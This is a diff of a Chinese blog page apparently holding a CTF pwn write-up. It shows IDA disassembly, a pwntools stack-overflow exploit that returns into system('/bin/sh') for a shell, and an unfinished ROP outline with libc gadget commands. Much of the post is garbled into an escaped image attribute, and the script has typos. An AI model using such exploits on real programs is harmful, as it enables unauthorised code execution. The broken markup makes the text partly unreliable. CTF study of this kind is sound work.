@@ -79,18 +79,20 @@
 
 
 
-<meta name="description" content="what she says means everything">
+<meta name="description" content="工具 ida">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Pwn">
 <meta property="og:url" content="http://erenphy.github.io/2020/03/18/Pwn/index.html">
 <meta property="og:site_name" content="LIXiaohui">
-<meta property="og:description" content="what she says means everything">
+<meta property="og:description" content="工具 ida">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://erenphy.github.io/erenphy.github.io/2020/03/18/Pwn/bofida.JPG">
 <meta property="article:published_time" content="2020-03-18T08:20:08.000Z">
-<meta property="article:modified_time" content="2020-03-18T10:22:27.404Z">
+<meta property="article:modified_time" content="2020-03-20T15:36:35.809Z">
 <meta property="article:author" content="lixiaohui">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://erenphy.github.io/erenphy.github.io/2020/03/18/Pwn/bofida.JPG">
 
 
 
@@ -330,7 +332,55 @@
       
 
       
-        
+        <h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p> ida</p>
+<a id="more"></a>
+<h2 id="BOF"><a href="#BOF" class="headerlink" title="BOF"></a>BOF</h2><ul>
+<li>ida分析pwn文件，在main函数中调用关系如图</li>
+</ul>
+<p><img src="/erenphy.github.io/2020/03/18/Pwn/bofida.JPG" class="" title="img} &lt;&#x2F;p&gt; &lt;p&gt;其中sub_804854A调用系统函数，sub_804851B开辟内存空间，&lt;br&gt;关键汇编代码： &lt;&#x2F;p&gt; <pre><code>.text:08048573 buf             = byte ptr -1Ch
+.text:08048573
+.text:08048573                 push    ebp
+.text:08048574                 mov     ebp, esp
+.text:08048576                 sub     esp, 28h
+.text:08048579                 call    sub_804851B
+.text:0804857E                 call    sub_804854A
+.text:08048583                 sub     esp, 0Ch
+.text:08048586                 push    offset s        ; &quot;can you pwn me?&quot;
+.text:0804858B                 call    _puts
+.text:08048590                 add     esp, 10h
+.text:08048593                 sub     esp, 4
+.text:08048596                 push    100h            ; nbytes
+.text:0804859B                 lea     eax, [ebp+buf]
+.text:0804859E                 push    eax             ; buf
+.text:0804859F                 push    0               ; fd
+.text:080485A1                 call    _read
+.text:080485A6                 add     esp, 10h</code></pre>&lt;p&gt;这里 sub esp,28h 开辟出28h内存，push 100h，读取的内存空间大，因此存在栈溢出！&lt;&#x2F;p&gt; &lt;ul&gt; &lt;li&gt;思路：填充数据长度，使得溢出覆盖返回地址。结合函数调用情况，可以设计payload的长度将返回地址覆盖到系统函数中。距此最近的是sub_804854A调用的_system函数 ,其开始地址为： &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;p&gt;{%asset_image bofsystem.JPG img} &lt;&#x2F;p&gt; &lt;p&gt;由此，构造的payload长度 &#x3D; 28+4(ebp)+p32(0x080483F0)+指向&#x2F;bin&#x2F;sh的指针&lt;br&gt; &lt;code&gt;gdb -find ‘sh’&lt;&#x2F;code&gt; 即可 获取指针地址&lt;br&gt;脚本如下：&lt;&#x2F;p&gt; <pre><code>form pwn inmport *    
+p = process(&apos;./pwn&apos;)
+sys_addr = 0x080483F0
+offset = 0x1c + 0x4
+sh_addr = 0x0804A02C
+payload = &apos;x&apos;*offset + p32(sys_addr) +&apos;x&apos;*0x4+ p32(sh_addr)
+p.recvuntil(&apos;can you pwn me&apos;)
+p.sendline(payload)
+p.interactive()  </code></pre>&lt;p&gt;在Linux中运行脚本，查看flag&lt;&#x2F;p&gt; &lt;h2 id&#x3D;ROP&gt;&lt;a href&#x3D;#ROP class&#x3D;headerlink title&#x3D;ROP&gt;&lt;&#x2F;a&gt;ROP&lt;&#x2F;h2&gt;&lt;ul&gt; &lt;li&gt;&lt;p&gt;汇编代码 &lt;&#x2F;p&gt; &lt;p&gt; .text:080484EA buf &#x3D; byte ptr -58h&lt;br&gt; .text:080484EA&lt;br&gt; .text:080484EA push ebp&lt;br&gt; .text:080484EB mov ebp, esp&lt;br&gt; .text:080484ED sub esp, 58h&lt;br&gt; .text:080484F0 sub esp, 0Ch&lt;br&gt; .text:080484F3 push offset s ; “welcome to ROP world”&lt;br&gt; .text:080484F8 call _puts&lt;br&gt; .text:080484FD add esp, 10h&lt;br&gt; .text:08048500 sub esp, 4&lt;br&gt; .text:08048503 push 0C8h ; nbytes&lt;br&gt; .text:08048508 lea eax, [ebp+buf]&lt;br&gt; .text:0804850B push eax ; buf&lt;br&gt; .text:0804850C push 0 ; fd&lt;br&gt; .text:0804850E call _read&lt;br&gt; .text:08048513 add esp, 10h&lt;br&gt; .text:08048516 nop&lt;br&gt; .text:08048517 leave&lt;br&gt; .text:08048518 retn&lt;br&gt; .text:08048518 sub_80484EA endp &lt;&#x2F;p&gt; &lt;&#x2F;li&gt; &lt;li&gt;&lt;p&gt;题目给出了libc文件&lt;&#x2F;p&gt; &lt;ul&gt; &lt;li&gt;可以在libc中找到&#x2F;bin&#x2F;sh的地址&lt;&#x2F;li&gt; &lt;li&gt;system返回地址在ida中可查&lt;br&gt;由此可以通过ROP溢出&lt;blockquote&gt; &lt;p&gt;返回导向编程(Return-Oriented Programming, ROP)是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。攻击者控制堆栈调用以劫持程序控制流并执行针对性的机器语言指令序列（称为Gadgets）。 每一段 gadget 通常结束于 return 指令，并位于共享库代码中的子程序。系列调用这些代码，攻击者可以在拥有更简单攻击防范的程序内执行任意操作。 &lt;&#x2F;p&gt; &lt;&#x2F;blockquote&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;li&gt; &lt;li&gt;&lt;p&gt;寻找程序漏洞点 &lt;&#x2F;p&gt; &lt;ul&gt; &lt;li&gt;&lt;p&gt;pwn2与上一节pwn的差别不是很大，区别在于，程序本身未调用system函数，我们想找到libc中的system的地址 &lt;&#x2F;p&gt; &lt;p&gt;objdump -T libc.so | grep “system”&lt;br&gt;#system 需要考虑系统函数的随机偏移&lt;br&gt;strings -tx libc.so | grep “&#x2F;bin&#x2F;sh”&lt;br&gt;ROPgadget –binary libc-so –only “pop|ret”&lt;&#x2F;p&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ul&gt; &lt;p&gt;分析程序流程:read()函数是关键，需要调用该函数将&#x2F;bin&#x2F;sh地址写入数据段 &lt;&#x2F;p&gt; <pre><code> #查看段信息
+readdlf -S pwn2  </code></pre>&lt;p&gt;如何调用read()函数呢？终于在init中找到这样一段汇编代码&lt;&#x2F;p&gt; <pre><code>.text:08048588 loc_8048588:                            ; CODE XREF: init+53j
+.text:08048588                 sub     esp, 4
+.text:0804858B                 push    [esp+20h+arg_8]
+.text:0804858F                 push    [esp+24h+arg_4]
+.text:08048593                 push    ebp
+.text:08048594                 call    ds:(off_8049F08 - 804A000h)[ebx+edi*4]
+.text:0804859B                 add     edi, 1
+.text:0804859E                 add     esp, 10h
+.text:080485A1                 cmp     edi, esi
+.text:080485A3                 jnz     short loc_8048588
+.text:080485A5
+.text:080485A5 loc_80485A5:                            ; CODE XREF: init+2Ej
+.text:080485A5                 add     esp, 0Ch
+.text:080485A8                 pop     ebx
+.text:080485A9                 pop     esi
+.text:080485AA                 pop     edi
+.text:080485AB                 pop     ebp
+.text:080485AC                 retn  </code></pre>&lt;p&gt;可见 loc_8048588调用了edx+edi*4的地址，loc_80485a5修改了寄存器的值&lt;br&gt;我们构造payload &#x3D;’x’ * 8 + gadget_addr+ sh_addr+ system_addr&lt;br&gt;脚本待更新 &lt;&#x2F;p&gt;">
       
     </div>
     
@@ -433,8 +483,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -449,7 +508,7 @@
               
                 <a href="/erenphy.github.io/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -494,6 +553,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#工具"><span class="nav-number">1.</span> <span class="nav-text">工具</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BOF"><span class="nav-number">2.</span> <span class="nav-text">BOF</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
